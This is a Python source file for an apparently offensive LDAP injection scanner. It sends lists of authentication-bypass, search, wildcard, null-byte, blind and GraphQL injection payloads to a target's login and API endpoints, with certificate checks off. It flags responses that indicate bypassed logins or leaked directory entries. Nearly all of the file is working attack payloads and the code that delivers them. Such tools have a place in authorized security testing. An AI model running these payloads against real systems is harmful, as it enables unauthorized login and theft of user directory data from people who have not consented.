"""LDAP injection — test for LDAP query manipulation, auth bypass, error-based, boolean-blind, time-blind."""

import httpx
import urllib.parse
import re
import asyncio
import time
import json


LDAP_TRUE_PAYLOADS = [
    ("always_true", "*"),
    ("always_true_parens", "(*)"),
    ("cn_true", ")(cn=*)"),
    ("admin_true", "admin)(&)"),
    ("objectclass", "(objectClass=*)"),
    ("admin_or", "(|(uid=admin))"),
    ("admin_or2", "(|(cn=admin))"),
    ("admin_or3", "(|(sAMAccountName=admin))"),
    ("admin_or4", "(|(userPrincipalName=admin*))"),
    ("wildcard_all", "(uid=*)"),
    ("wildcard_all2", "(cn=*)"),
    ("wildcard_all3", "(sAMAccountName=*)"),
    ("or_true", "(|(uid=*))"),
    ("or_true2", "(|(cn=*))"),
    ("or_true3", "(|(sn=*))"),
    ("paren_true", "())(|"),
    ("double_paren", "*)(&)"),
    ("close_parens", "admin))%00"),
    ("null_terminate", "admin)(|(password=*))"),
    ("always_true_ext", "(&(uid=*)(uid=*))"),
    ("admin_bypass", "(uid=*)(uid=admin)"),
    ("or_auth_bypass", "(|(uid=admin)(uid=*)))"),
    ("auth_bypass2", "(|(cn=admin)(cn=*)))"),
    ("auth_bypass3", "(|(sAMAccountName=admin)(sAMAccountName=*)))"),
    ("auth_bypass4", "(&(uid=admin)(password=*))"),
    ("auth_bypass5", "(&(cn=admin)(userPassword=*))"),
    ("filter_bypass", "(&(objectClass=*)(uid=admin))"),
    ("filter_bypass2", "(&(objectClass=*)(cn=admin))"),
    ("wildcard_auth", "(uid=*)(userPassword=*)"),
    ("empty_filter", "(objectClass=)"),
    ("nested_or", "(|(uid=admin)(uid=root)(uid=*)))"),
    ("nested_and", "(&(uid=admin)(objectClass=*))"),
    ("openldap_true", "(objectClass=*)"),
    ("ad_true", "(objectCategory=person)"),
    ("edirectory_true", "(objectClass=inetOrgPerson)"),
    ("always_false", "(!(objectClass=*))"),
    ("false_never", "(uid=__NOMATCH__*)"),
]

LDAP_AUTH_BYPASS_PAYLOADS = [
    ("auth_bypass_star", {"username": "*", "password": "*"}),
    ("auth_bypass_or", {"username": "admin)(&)", "password": "x"}),
    ("auth_bypass_true", {"username": "*", "password": "x"}),
    ("auth_bypass_cn", {"username": "(cn=admin)*)(&", "password": "x"}),
    ("auth_bypass_sam", {"username": "(sAMAccountName=admin)*)(&", "password": "x"}),
    ("auth_bypass_upn", {"username": "(userPrincipalName=admin*)*)(&", "password": "x"}),
    ("auth_bypass_filter", {"username": "admin)(|(password=*))", "password": "x"}),
    ("auth_bypass_wildcard", {"username": "admin)(", "password": "*)(&)"}),
    ("auth_bypass_close", {"username": "admin))", "password": "x"}),
    ("auth_bypass_never", {"username": "admin%00", "password": "x"}),
    ("auth_bypass_star2", {"username": "admin)(uid=*)", "password": "x"}),
    ("auth_bypass_or2", {"username": "(|(uid=admin)(uid=*)))", "password": "x"}),
    ("auth_bypass_openldap", {"username": "admin)(&)", "password": "*)(&)"}),
    ("auth_bypass_ad", {"username": "admin)(objectClass=*)", "password": "x"}),
    ("auth_bypass_or3", {"username": "(|(cn=*)(uid=admin))", "password": "x"}),
    ("auth_bypass_or4", {"username": "(|(sAMAccountName=*)(uid=admin))", "password": "x"}),
]

LDAP_SEARCH_PAYLOADS = [
    ("search_true", "*"),
    ("search_admin", "admin*"),
    ("search_root", "root*"),
    ("search_star", "*)"),
    ("search_or", "(|(uid=*))"),
    ("search_or2", "(|(cn=*))"),
    ("search_true_parens", "(*)"),
    ("search_admin_parens", "(admin*)"),
    ("search_objectclass", "(objectClass=*)"),
    ("search_wildcard", "uid=*)(&"),
    ("search_bypass", "admin)(|(uid=*))"),
    ("search_nested", "(|(uid=admin*)(uid=root*)(uid=*)))"),
    ("search_all_users", "(&(objectClass=person))"),
    ("search_admin_users", "(&(objectClass=*)(uid=admin*))"),
    ("search_ad_users", "(&(objectCategory=person)(sAMAccountName=admin*))"),
    ("search_openldap", "(&(objectClass=inetOrgPerson)(uid=admin*))"),
]

LDAP_ERROR_INDICATORS = [
    r"ldap_search",
    r"LDAP Error",
    r"ldap_bind",
    r"invalid syntax",
    r"size limit exceeded",
    r"operations error",
    r"protocol error",
    r"no such object",
    r"invalid DN syntax",
    r"unwilling to perform",
    r"constraint violation",
    r"no such attribute",
    r"undefined attribute type",
    r"inappropriate matching",
    r"invalid attribute value",
    r"LDAP_REFERRAL",
    r"administrative limit exceeded",
    r"object class violation",
    r"LDAP_TIMEOUT",
    r"connection closed",
    r"OpenLDAP",
    r"Active Directory",
    r"Novell",
    r"eDirectory",
    r" slapd",
    r"cn=config",
]

LDAP_SERVER_SIGNATURES = {
    "OpenLDAP": ["openldap", "slapd", "cn=config"],
    "Active Directory": ["active directory", "microsoft", "ad ldap", "domain controller"],
    "Novell eDirectory": ["novell", "edirectory", "nds"],
    "IBM Tivoli": ["tivoli", "ibm ldap"],
    "Oracle Internet Directory": ["oracle", "oid"],
}


def _detect_ldap_error(body: str, status: int) -> dict | None:
    """Detect LDAP error messages in response."""
    lower = body.lower()
    for pattern in LDAP_ERROR_INDICATORS:
        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            start = max(0, match.start() - 60)
            end = min(len(body), match.end() + 100)
            return {
                "pattern": pattern,
                "snippet": body[start:end].strip(),
                "position": match.start(),
            }
    if status == 500 and ("ldap" in lower or "bind" in lower or "dn" in lower):
        return {"pattern": "status_500_ldap", "snippet": body[:300], "position": 0}
    return None


def _detect_ldap_server(body: str, headers: dict) -> str:
    """Detect LDAP server type from error messages or headers."""
    lower = body.lower()
    header_str = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()
    combined = lower + " " + header_str
    for server, signatures in LDAP_SERVER_SIGNATURES.items():
        for sig in signatures:
            if sig in combined:
                return server
    return "Unknown"


def _extract_evidence(body: str, indicator: str, context: int = 120) -> str:
    """Extract evidence around a matched indicator."""
    idx = body.lower().find(indicator.lower())
    if idx == -1:
        return body[:300]
    start = max(0, idx - context)
    end = min(len(body), idx + context * 2)
    return body[start:end]


def _compare_boolean_responses(true_resp: dict, false_resp: dict) -> dict:
    """Compare true/false boolean responses."""
    indicators = []
    if true_resp["status"] != false_resp["status"]:
        indicators.append(f"Status differs: {true_resp['status']} vs {false_resp['status']}")
    size_diff = abs(true_resp["size"] - false_resp["size"])
    if size_diff > 30:
        indicators.append(f"Size differs: {true_resp['size']} vs {false_resp['size']} ({size_diff} bytes)")
    if true_resp["has_data"] and not false_resp["has_data"]:
        indicators.append("True has data, false has none")
    return {
        "indicators": indicators,
        "vulnerable": len(indicators) > 0,
        "severity": "CRITICAL" if true_resp["status"] != false_resp["status"] and true_resp["has_data"] else ("HIGH" if indicators else "NONE"),
    }


def _has_data(body: str) -> bool:
    """Check if response contains data-like content."""
    indicators = [
        "username", "email", "password", "name", "dn",
        "cn=", "uid=", "ou=", "objectclass", "sn=",
        "displayname", "mail", "telephonenumber",
    ]
    lower = body.lower()
    return sum(1 for ind in indicators if ind in lower) >= 2


async def ldap_inject(target: str) -> dict:
    """LDAP injection testing — auth bypass, error-based, boolean-blind, search injection, multi-server detection."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    results = []
    detected_server = "Unknown"

    async with httpx.AsyncClient(timeout=12.0, verify=False, follow_redirects=True) as client:
        # Get baseline
        baseline_status = 0
        baseline_size = 0
        baseline_body = ""
        try:
            resp = await client.get(target)
            baseline_status = resp.status_code
            baseline_size = len(resp.text)
            baseline_body = resp.text
        except Exception:
            pass

        # Detect LDAP server from baseline
        try:
            resp = await client.get(target)
            detected_server = _detect_ldap_server(resp.text, dict(resp.headers))
        except Exception:
            pass

        # --- Test 1: Auth bypass via POST with JSON ---
        login_endpoints = [base, f"{base}/login", f"{base}/auth", f"{base}/signin", f"{base}/api/login"]
        for endpoint in login_endpoints:
            for name, payload in LDAP_AUTH_BYPASS_PAYLOADS:
                try:
                    headers = {"Content-Type": "application/json"}
                    resp = await client.post(endpoint, json=payload, headers=headers)
                    body = resp.text
                    lower = body.lower()

                    auth_indicators = ["token", "session", "welcome", "success", "logged",
                                       "dashboard", "profile", "redirect", "jwt", "access_token"]
                    has_auth = any(ind in lower for ind in auth_indicators)

                    error = _detect_ldap_error(body, resp.status_code)

                    if has_auth and resp.status_code in (200, 301, 302):
                        results.append({
                            "technique": "auth_bypass",
                            "endpoint": endpoint,
                            "payload": name,
                            "username": payload.get("username", ""),
                            "status": resp.status_code,
                            "evidence": _extract_evidence(body, auth_indicators[0]),
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break

                    if error:
                        results.append({
                            "technique": "error_based",
                            "endpoint": endpoint,
                            "payload": name,
                            "error": error,
                            "status": resp.status_code,
                            "server": detected_server,
                            "risk": "HIGH",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 2: Auth bypass via form data ---
        for endpoint in login_endpoints[:2]:
            for name, payload in LDAP_AUTH_BYPASS_PAYLOADS[:8]:
                try:
                    resp = await client.post(endpoint, data=payload)
                    body = resp.text
                    lower = body.lower()

                    auth_indicators = ["token", "session", "welcome", "success", "logged", "dashboard"]
                    has_auth = any(ind in lower for ind in auth_indicators)

                    if has_auth and resp.status_code in (200, 301, 302):
                        results.append({
                            "technique": "auth_bypass_form",
                            "endpoint": endpoint,
                            "payload": name,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 3: Auth bypass via URL params ---
        for param in ["username", "user", "uid", "cn", "login", "email", "search", "q"]:
            for name, payload_str in [("star", "*"), ("or_bypass", "admin)(&)"), ("true", "(objectClass=*)")]:
                try:
                    url = f"{base}?{urllib.parse.urlencode({param: payload_str})}"
                    resp = await client.get(url)
                    body = resp.text

                    error = _detect_ldap_error(body, resp.status_code)
                    if error:
                        results.append({
                            "technique": "error_based_url",
                            "param": param,
                            "payload": name,
                            "error": error,
                            "status": resp.status_code,
                            "risk": "HIGH",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 4: Boolean-based blind LDAP ---
        for param in ["username", "user", "uid", "cn", "search", "q"]:
            true_payload = LDAP_TRUE_PAYLOADS[0][1]  # *
            false_payload = LDAP_TRUE_PAYLOADS[-2][1]  # (!(objectClass=*))
            try:
                true_url = f"{base}?{urllib.parse.urlencode({param: true_payload})}"
                false_url = f"{base}?{urllib.parse.urlencode({param: false_payload})}"
                true_resp = await client.get(true_url)
                false_resp = await client.get(false_url)

                true_data = {
                    "status": true_resp.status_code,
                    "size": len(true_resp.text),
                    "has_data": _has_data(true_resp.text),
                }
                false_data = {
                    "status": false_resp.status_code,
                    "size": len(false_resp.text),
                    "has_data": _has_data(false_resp.text),
                }

                comparison = _compare_boolean_responses(true_data, false_data)
                if comparison["vulnerable"]:
                    results.append({
                        "technique": "boolean_blind",
                        "param": param,
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "comparison": comparison,
                        "risk": "HIGH",
                        "confidence": "high",
                    })
            except Exception:
                continue

        # --- Test 5: Time-based blind LDAP ---
        time_payloads = [
            ("waitfor", "admin)(objectClass=*))%0a(unused=*(|(objectClass=*)(objectClass=*"),
            ("sleep_like", "*%0a(unused=*(|(uid=*"),
            ("long_filter", "admin)(&)(objectClass=*)"),
        ]
        for param in ["username", "user", "search"]:
            for name, payload in time_payloads:
                try:
                    url = f"{base}?{urllib.parse.urlencode({param: payload})}"
                    start = time.time()
                    resp = await client.get(url)
                    elapsed = time.time() - start
                    if elapsed > 4.0:
                        results.append({
                            "technique": "time_blind",
                            "param": param,
                            "payload": name,
                            "elapsed_seconds": round(elapsed, 2),
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "medium",
                        })
                except httpx.TimeoutException:
                    results.append({
                        "technique": "time_blind",
                        "param": param,
                        "payload": name,
                        "elapsed_seconds": "TIMEOUT",
                        "status": "TIMEOUT",
                        "risk": "CRITICAL",
                        "confidence": "high",
                    })
                except Exception:
                    continue

        # --- Test 6: Search injection ---
        for name, payload in LDAP_SEARCH_PAYLOADS:
            try:
                for search_param in ["search", "q", "query", "filter", "find"]:
                    url = f"{base}?{urllib.parse.urlencode({search_param: payload})}"
                    resp = await client.get(url)
                    body = resp.text

                    error = _detect_ldap_error(body, resp.status_code)
                    data_leak = _has_data(body)

                    if error:
                        results.append({
                            "technique": "search_injection_error",
                            "param": search_param,
                            "payload": name,
                            "error": error,
                            "status": resp.status_code,
                            "server": detected_server,
                            "risk": "HIGH",
                            "confidence": "high",
                        })
                        break

                    if data_leak and resp.status_code == 200:
                        results.append({
                            "technique": "search_injection_data",
                            "param": search_param,
                            "payload": name,
                            "evidence": _extract_evidence(body, "dn="),
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
            except Exception:
                continue

        # --- Test 7: Null byte injection ---
        null_payloads = [
            ("null_terminate", "admin%00"),
            ("null_true", "admin%00*)(objectClass=*)"),
            ("null_filter", "*%00)(|(uid=*"),
            ("null_close", "admin)%00"),
        ]
        for param in ["username", "user", "uid", "search"]:
            for name, payload in null_payloads:
                try:
                    url = f"{base}?{urllib.parse.urlencode({param: payload})}"
                    resp = await client.get(url)
                    body = resp.text

                    error = _detect_ldap_error(body, resp.status_code)
                    data_leak = _has_data(body)

                    if not error and data_leak and resp.status_code == 200:
                        results.append({
                            "technique": "null_byte_injection",
                            "param": param,
                            "payload": name,
                            "evidence": _extract_evidence(body, "dn="),
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 8: Wildcard injection ---
        for param in ["username", "user", "uid", "cn", "search"]:
            for pattern in ["*", "admin*", "*admin*", "*root*", "*admin"]:
                try:
                    url = f"{base}?{urllib.parse.urlencode({param: pattern})}"
                    resp = await client.get(url)
                    body = resp.text

                    data_leak = _has_data(body)
                    if data_leak and resp.status_code == 200:
                        results.append({
                            "technique": "wildcard_injection",
                            "param": param,
                            "payload": pattern,
                            "evidence": _extract_evidence(body, "dn="),
                            "status": resp.status_code,
                            "risk": "HIGH",
                            "confidence": "medium",
                        })
                        break
                except Exception:
                    continue

        # --- Test 9: POST JSON LDAP injection on API endpoints ---
        api_endpoints = [f"{base}/api", f"{base}/api/search", f"{base}/api/users",
                         f"{base}/api/ldap", f"{base}/api/auth", f"{base}/graphql"]
        for endpoint in api_endpoints:
            for name, payload in LDAP_TRUE_PAYLOADS[:10]:
                try:
                    data = {"filter": payload, "query": payload, "search": payload, "username": payload}
                    headers = {"Content-Type": "application/json"}
                    resp = await client.post(endpoint, json=data, headers=headers)
                    body = resp.text

                    error = _detect_ldap_error(body, resp.status_code)
                    data_leak = _has_data(body)

                    if error:
                        results.append({
                            "technique": "api_ldap_injection",
                            "endpoint": endpoint,
                            "payload": name,
                            "error": error,
                            "status": resp.status_code,
                            "risk": "HIGH",
                            "confidence": "high",
                        })
                        break

                    if data_leak and resp.status_code == 200:
                        results.append({
                            "technique": "api_ldap_data_leak",
                            "endpoint": endpoint,
                            "payload": name,
                            "evidence": _extract_evidence(body, "dn="),
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

        # --- Test 10: GraphQL LDAP injection ---
        graphql_queries = [
            '{"query":"query{users(filter:\"*\"){id,username,email}}"}',
            '{"query":"query{users(filter:\"admin)(objectClass=*)\"){id,username,email}}"}',
            '{"query":"query{user(username:\"*\"){id,dn,username}}"}',
            '{"query":"query{search(q:\"*)(uid=*))\"){id,username}}"}',
        ]
        for query_str in graphql_queries:
            try:
                headers = {"Content-Type": "application/json"}
                resp = await client.post(f"{base}/graphql", content=query_str, headers=headers)
                body = resp.text

                error = _detect_ldap_error(body, resp.status_code)
                data_leak = _has_data(body)

                if error or data_leak:
                    results.append({
                        "technique": "graphql_ldap_injection",
                        "query": query_str[:120],
                        "error": error,
                        "data_leak": data_leak,
                        "status": resp.status_code,
                        "risk": "CRITICAL" if data_leak else "HIGH",
                        "confidence": "high",
                    })
            except Exception:
                continue

    return {
        "target": target,
        "detected_server": detected_server,
        "results": results,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
